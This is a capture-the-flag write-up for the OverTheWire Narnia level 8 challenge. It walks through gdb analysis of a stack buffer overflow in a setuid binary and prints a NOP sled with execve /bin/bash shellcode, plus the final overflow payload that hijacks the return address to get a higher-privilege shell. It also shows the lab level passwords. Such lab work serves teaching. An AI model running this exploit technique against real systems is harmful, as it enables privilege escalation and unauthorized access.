# Narnia Level 7 → Level 8 Build payload

## Previous Flag
<b>i1SQ81fkb8</b>

## Goal
Use previous password to log in SSH with user <b>narnia8</b> and port <b>2226</b> accessed on narnia.labs.overthewire.org.

There is no information for this level, intentionally.

## What I learned
```
func function contains vulnerability where override bok[20] from blah (argument from terminal) 
```

## Solution
```
PS C:\Users\trung.DESKTOP-G7C81CH\Downloads\01noobHacker> ssh narnia8@narnia.labs.overthewire.org -p 2226 ⌨️
narnia8@narnia:~$ cd /narnia/ ⌨️
narnia8@narnia:/narnia$ file narnia8 ⌨️
narnia8: setuid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=dca0d26a720ea468b23bfa00ba25cd28776b722f, for GNU/Linux 3.2.0, not stripped
narnia8@narnia:/narnia$ cat narnia8.c ⌨️
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
// gcc's variable reordering fucked things up to keep the level in its old style i am
// making "i" global until i find a fix
// -morla
int i;

void func(char *b){
        char *blah=b;
        char bok[20];
        //int i=0;

        memset(bok, '\0', sizeof(bok));
        for(i=0; blah[i] != '\0'; i++)
                bok[i]=blah[i];                 // Vulnerability Here, not limit to blah

        printf("%s\n",bok);
}

int main(int argc, char **argv){
        if(argc > 1)
                func(argv[1]);
        else
        printf("%s argument\n", argv[0]);

        return 0;
}
narnia8@narnia:/narnia$ ./narnia8 ⌨️
./narnia8 argument      
narnia8@narnia:/narnia$ ./narnia8 $(python3 -c "print('A'*4)") ⌨️
AAAA
narnia8@narnia:/narnia$ ./narnia8 $(python3 -c "print('A'*30)") ⌨️
AAAAAAAAAAAAAAAAAAAAA
narnia8@narnia:/narnia$ gdb -q narnia8 ⌨️
Reading symbols from narnia8...

This GDB supports auto-downloading debuginfo from the following URLs:
  <https://debuginfod.ubuntu.com>
Enable debuginfod for this session? (y or [n]) y ⌨️
Debuginfod has been enabled.
To make this setting permanent, add 'set debuginfod enabled on' to .gdbinit.
Download failed: Permission denied.  Continuing without separate debug info for /narnia/narnia8.
(No debugging symbols found in narnia8)
(gdb) disassemble func ⌨️
Dump of assembler code for function func:
   0x08049176 <+0>:     push   %ebp
   0x08049177 <+1>:     mov    %esp,%ebp
   0x08049179 <+3>:     sub    $0x18,%esp
   0x0804917c <+6>:     mov    0x8(%ebp),%eax
   0x0804917f <+9>:     mov    %eax,-0x4(%ebp)
   0x08049182 <+12>:    push   $0x14
   0x08049184 <+14>:    push   $0x0
   0x08049186 <+16>:    lea    -0x18(%ebp),%eax
   0x08049189 <+19>:    push   %eax
   0x0804918a <+20>:    call   0x8049050 <memset@plt>
   0x0804918f <+25>:    add    $0xc,%esp
   0x08049192 <+28>:    movl   $0x0,0x804b228
   0x0804919c <+38>:    jmp    0x80491c3 <func+77>
--Type <RET> for more, q to quit, c to continue without paging--c
   0x0804919e <+40>:    mov    0x804b228,%eax
   0x080491a3 <+45>:    mov    %eax,%edx
   0x080491a5 <+47>:    mov    -0x4(%ebp),%eax
   0x080491a8 <+50>:    add    %eax,%edx
   0x080491aa <+52>:    mov    0x804b228,%eax
   0x080491af <+57>:    movzbl (%edx),%edx
   0x080491b2 <+60>:    mov    %dl,-0x18(%ebp,%eax,1)
   0x080491b6 <+64>:    mov    0x804b228,%eax
   0x080491bb <+69>:    add    $0x1,%eax
   0x080491be <+72>:    mov    %eax,0x804b228
   0x080491c3 <+77>:    mov    0x804b228,%eax
   0x080491c8 <+82>:    mov    %eax,%edx
   0x080491ca <+84>:    mov    -0x4(%ebp),%eax
   0x080491cd <+87>:    add    %edx,%eax
   0x080491cf <+89>:    movzbl (%eax),%eax
   0x080491d2 <+92>:    test   %al,%al
   0x080491d4 <+94>:    jne    0x804919e <func+40>
   0x080491d6 <+96>:    lea    -0x18(%ebp),%eax
   0x080491d9 <+99>:    push   %eax
   0x080491da <+100>:   push   $0x804a008
   0x080491df <+105>:   call   0x8049040 <printf@plt>
   0x080491e4 <+110>:   add    $0x8,%esp
   0x080491e7 <+113>:   nop
   0x080491e8 <+114>:   leave
   0x080491e9 <+115>:   ret
End of assembler dump.
(gdb) break *func+110 ⌨️                                 # Note: Don't mix up with break *main+110
Breakpoint 1 at 0x80491e4
(gdb) run AAAA ⌨️
Starting program: /narnia/narnia8 AAAA
Download failed: Permission denied.  Continuing without separate debug info for system-supplied DSO at 0xf7fc7000.
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
AAAA

Breakpoint 1, 0x080491e4 in func ()
(gdb) x/20wx $esp ⌨️
0xffffd34c:     0x0804a008      0xffffd354      0x41414141👀    0x00000000 👀 bok[20] = 5x4 but the AAAA filled one
0xffffd35c:     0x00000000      0x00000000      0x00000000      0xffffd5ba 👀 x/wx 0xffffd5ba
0xffffd36c:     0xffffd378      0x08049201      0xffffd5ba      0x00000000 👀 $ebp like a backup of $esp
0xffffd37c:     0xf7d9ecb9      0x00000002      0xffffd434      0xffffd440
(gdb) info registers ⌨️
eax            0x5                 5
ecx            0x0                 0
edx            0x0                 0
ebx            0xf7faae34          -134566348
esp            0xffffd34c          0xffffd34c 👀 Stack pointer starts at this addy
ebp            0xffffd36c          0xffffd36c 👀 Base pointer is a copy of stack pointer, starts at this addy
esi            0xffffd440          -11200
edi            0xf7ffcb60          -134231200
eip            0x80491e4           0x80491e4 <func+110>
eflags         0x296               [ PF AF SF IF ]
cs             0x23                35
ss             0x2b                43
ds             0x2b                43
es             0x2b                43
--Type <RET> for more, q to quit, c to continue without paging--c
fs             0x0                 0
gs             0x63                99
k0             0x0                 0
k1             0x0                 0
k2             0x0                 0
k3             0x0                 0
k4             0x0                 0
k5             0x0                 0
k6             0x0                 0
k7             0x0                 0

# Examine what inside memory next to $esb
(gdb) x/wx 0x08049201 ⌨️
0x8049201 <main+23>:    0xeb04c483
(gdb) disassemble main ⌨️
Dump of assembler code for function main:
   0x080491ea <+0>:     push   %ebp
   0x080491eb <+1>:     mov    %esp,%ebp
   0x080491ed <+3>:     cmpl   $0x1,0x8(%ebp)
   0x080491f1 <+7>:     jle    0x8049206 <main+28>
   0x080491f3 <+9>:     mov    0xc(%ebp),%eax
   0x080491f6 <+12>:    add    $0x4,%eax
   0x080491f9 <+15>:    mov    (%eax),%eax
   0x080491fb <+17>:    push   %eax
   0x080491fc <+18>:    call   0x8049176 <func>
   0x08049201 <+23>:    add    $0x4,%esp 👀 return addy of func
   0x08049204 <+26>:    jmp    0x8049219 <main+47>
   0x08049206 <+28>:    mov    0xc(%ebp),%eax
   0x08049209 <+31>:    mov    (%eax),%eax
--Type <RET> for more, q to quit, c to continue without paging--c
   0x0804920b <+33>:    push   %eax
   0x0804920c <+34>:    push   $0x804a00c
   0x08049211 <+39>:    call   0x8049040 <printf@plt>
   0x08049216 <+44>:    add    $0x8,%esp
   0x08049219 <+47>:    mov    $0x0,%eax
   0x0804921e <+52>:    leave
   0x0804921f <+53>:    ret
End of assembler dump.

(gdb) x/wx 0xffffd5ba ⌨️                          // Memory address is our input
0xffffd5ba:     0x41414141
(gdb) x/s 0xffffd5ba ⌨️
0xffffd5ba:     "AAAA"
(gdb) x/200wx $esp ⌨️
0xffffd34c:     0x0804a008      0xffffd354      0x41414141      0x00000000
0xffffd35c:     0x00000000      0x00000000      0x00000000      0xffffd5ba 👀
0xffffd36c:     0xffffd378      0x08049201      0xffffd5ba      0x00000000 
0xffffd37c:     0xf7d9ecb9      0x00000002      0xffffd434      0xffffd440
0xffffd38c:     0xffffd3a0      0xf7faae34      0x0804908d      0x00000002
0xffffd39c:     0xffffd434      0xf7faae34      0xffffd440      0xf7ffcb60
0xffffd3ac:     0x00000000      0xd8dda892      0x94a24282      0x00000000
0xffffd3bc:     0x00000000      0x00000000      0xf7ffcb60      0x00000000
0xffffd3cc:     0x3aab8500      0xf7ffda20      0xf7d9ec46      0xf7faae34
0xffffd3dc:     0xf7d9ed7c      0xf7fc9af4      0x0804b114      0x00000000
0xffffd3ec:     0xf7ffd000      0x00000000      0xf7fdabb0      0xf7d9ecfd
0xffffd3fc:     0x0804b204      0x00000002      0x08049060      0x00000000
0xffffd40c:     0x08049088      0x0804908d      0x00000002      0xffffd434
0xffffd41c:     0x00000000      0x00000000      0xf7fcde80      0xffffd42c
--Type <RET> for more, q to quit, c to continue without paging--c
0xffffd42c:     0xf7ffda20      0x00000002      0xffffd5aa      0xffffd5ba
0xffffd43c:     0x00000000      0xffffd5bf      0xffffd5cf      0xffffd5db
0xffffd44c:     0xffffd5eb      0xffffd600      0xffffd60f      0xffffd618
0xffffd45c:     0xffffd62b      0xffffd638      0xffffdd51      0xffffdd5d
0xffffd46c:     0xffffdd8f      0xffffddb1      0xffffddc8      0xffffdddc
0xffffd47c:     0xffffddfc      0xffffde09      0xffffde11      0xffffde25
0xffffd48c:     0xffffde45      0xffffde68      0xffffde7e      0xffffdead
0xffffd49c:     0xffffdec0      0xffffdecb      0xffffdf0c      0xffffdf74
0xffffd4ac:     0xffffdfab      0xffffdfbf      0xffffdfd4      0x00000000
0xffffd4bc:     0x00000020      0xf7fc7570      0x00000021      0xf7fc7000
0xffffd4cc:     0x00000033      0x00000e30      0x00000010      0x1f8bfbff
0xffffd4dc:     0x00000006      0x00001000      0x00000011      0x00000064
0xffffd4ec:     0x00000003      0x08048034      0x00000004      0x00000020
0xffffd4fc:     0x00000005      0x0000000a      0x00000007      0xf7fc9000
0xffffd50c:     0x00000008      0x00000000      0x00000009      0x08049060
0xffffd51c:     0x0000000b      0x000036b8      0x0000000c      0x000036b8
0xffffd52c:     0x0000000d      0x000036b8      0x0000000e      0x000036b8
0xffffd53c:     0x00000017      0x00000001      0x00000019      0xffffd58b
0xffffd54c:     0x0000001a      0x00000002      0x0000001f      0xffffdfe8
0xffffd55c:     0x0000000f      0xffffd59b      0x0000001b      0x0000001c
0xffffd56c:     0x0000001c      0x00000020      0x00000000      0x00000000
0xffffd57c:     0x00000000      0x00000000      0x00000000      0x02000000
0xffffd58c:     0x543aab85      0x41b693bd      0x18762e2d      0x69de58bb
0xffffd59c:     0x00363836      0x00000000      0x00000000      0x6e2f0000
0xffffd5ac:     0x696e7261      0x616e2f61      0x61696e72      0x41410038
0xffffd5bc:     0x53004141      0x4c4c4548      0x69622f3d      0x61622f6e
0xffffd5cc:     0x50006873      0x2f3d4457      0x6e72616e      0x4c006169
0xffffd5dc:     0x414e474f      0x6e3d454d      0x696e7261      0x58003861
0xffffd5ec:     0x535f4744      0x49535345      0x545f4e4f      0x3d455059
0xffffd5fc:     0x00797474      0x752f3d5f      0x622f7273      0x672f6e69
0xffffd60c:     0x4c006264      0x53454e49      0x0035313d      0x454d4f48
0xffffd61c:     0x6f682f3d      0x6e2f656d      0x696e7261      0x4c003861
0xffffd62c:     0x3d474e41      0x54552e43      0x00382d46      0x435f534c
0xffffd63c:     0x524f4c4f      0x73723d53      0x643a303d      0x31303d69
0xffffd64c:     0x3a34333b      0x303d6e6c      0x36333b31      0x3d686d3a
0xffffd65c:     0x703a3030      0x30343d69      0x3a33333b      0x303d6f73
(gdb) run AAAAA ⌨️
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /narnia/narnia8 AAAAA
Download failed: Permission denied.  Continuing without separate debug info for system-supplied DSO at 0xf7fc7000.
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
AAAAA

Breakpoint 1, 0x080491e4 in func ()
(gdb) x/20wx $esp ⌨️
0xffffd34c:     0x0804a008      0xffffd354      0x41414141      0x00000041
0xffffd35c:     0x00000000      0x00000000      0x00000000      0xffffd5b9👀 from 0xffffd5ba
0xffffd36c:     0xffffd378      0x08049201      0xffffd5b9      0x00000000
0xffffd37c:     0xf7d9ecb9      0x00000002      0xffffd434      0xffffd440
0xffffd38c:     0xffffd3a0      0xf7faae34      0x0804908d      0x00000002
(gdb) exit ⌨️
A debugging session is active.

        Inferior 1 [process 435758] will be killed.

Quit anyway? (y or n) y ⌨️

# Create payload make random number of NOP slider so it slides down to shell then figure out address of NOP slider
Source: https://shell-storm.org/shellcode/files/shellcode-606.html
33 bytes: \x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80
narnia8@narnia:/narnia$ export SHELLCODE=$'\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80' ⌨️⭐⭐⭐⭐⭐
narnia8@narnia:/narnia$ gdb -q narnia8 ⌨️
Reading symbols from narnia8...

This GDB supports auto-downloading debuginfo from the following URLs:
  <https://debuginfod.ubuntu.com>
Enable debuginfod for this session? (y or [n]) y ⌨️
Debuginfod has been enabled.
To make this setting permanent, add 'set debuginfod enabled on' to .gdbinit.
Download failed: Permission denied.  Continuing without separate debug info for /narnia/narnia8.
(No debugging symbols found in narnia8)
(gdb) break main ⌨️
Breakpoint 1 at 0x80491ed
(gdb) run ⌨️
Starting program: /narnia/narnia8
Download failed: Permission denied.  Continuing without separate debug info for system-supplied DSO at 0xf7fc7000.
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".

Breakpoint 1, 0x080491ed in main ()
(gdb) x/s *((char **)environ) ⌨️❤️
0xffffd552:     "SHELL=/bin/bash"
(gdb) x/s *((char **)environ+1) ⌨️
0xffffd563👀:     "SHELLCODE=", '\220' <repeats 64 times>, "j\vX\231Rfh-p\211\341Rjhh/bash/bin\211\343RQS\211\341̀"

# We just need the thing to right of SHELL(5 bytes) CODE=(bytes) called the SHELLCODE and get the addy on left
(gdb) x/s 0xffffd563+5 ⌨️
0xffffd568:     "CODE=", '\220' <repeats 64 times>, "j\vX\231Rfh-p\211\341Rjhh/bash/bin\211\343RQS\211\341̀"
(gdb) x/s 0xffffd563+10 ⌨️
0xffffd56d👀:     '\220' <repeats 64 times>, "j\vX\231Rfh-p\211\341Rjhh/bash/bin\211\343RQS\211\341̀"
(gdb) exit⌨️
A debugging session is active.

        Inferior 1 [process 975409] will be killed.

Quit anyway? (y or n) y ⌨️

narnia8@narnia:/narnia$ whatis xxd ⌨️
xxd (1)              - make a hex dump or do the reverse.

# Payload = bok[20] + *blah (4 bytes) + EBP (4 bytes) + Return address redirected to shell (0xffffd56d)
narnia8@narnia:/narnia$ ./narnia8 $(echo -e "AAAAAAAAAAAAAAAAAAAA") | xxd ⌨️
00000000: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
00000010: 4141 4141 👀5cd5 ffff👀 38d3 ffff 0192 0408  AAAA\...8....... 👀 *blah = 0xffffd338
00000020: 5cd5 ffff 0a                             \....
# Calculate when 12 bytes of data from rest of payload increase blah decreases by ?
narnia8@narnia:/narnia$ python3 -c "print(hex(12))" ⌨️
0xc
narnia8@narnia:/narnia$ python3 -c "print(hex(0x5c - 0xc))" ⌨️
0x50
# modfied blah addy = 0xffffd550
narnia8@narnia:/narnia$ ./narnia8 $(echo -e "AAAAAAAAAAAAAAAAAAAA\x50\xd5\xff\xffAAAA\x6d\xd5\xff\xff") ⌨️
AAAAAAAAAAAAAAAAAAAAPAAAAmP 
Segmentation fault (core dumped)
narnia8@narnia:/narnia$ ./narnia8 $(echo -e "AAAAAAAAAAAAAAAAAAAA\x50\xd5\xff\xffAAAA\x6f\xd5\xff\xff") ⌨️
AAAAAAAAAAAAAAAAAAAAPAAAAoP
Segmentation fault (core dumped)
narnia8@narnia:/narnia$ ./narnia8 $(echo -e "AAAAAAAAAAAAAAAAAAAA\x50\xd5\xff\xffAAAA\x7d\xd5\xff\xff") ⌨️
AAAAAAAAAAAAAAAAAAAAPAAAA}P
Segmentation fault (core dumped)
narnia8@narnia:/narnia$ ./narnia8 $(echo -e "AAAAAAAAAAAAAAAAAAAA\x50\xd5\xff\xffAAAA\x8d\xd5\xff\xff") ⌨️
AAAAAAAAAAAAAAAAAAAAPAAAAP
bash-5.2$ whoami ⌨️
narnia9
bash-5.2$ cat /etc/narnia_pass/narnia9 ⌨️
1FFD4HnU4K 🔐
```

## Flag
<b>1FFD4HnU4K</b>

## Continue
[Continue](./Narnia0809.md)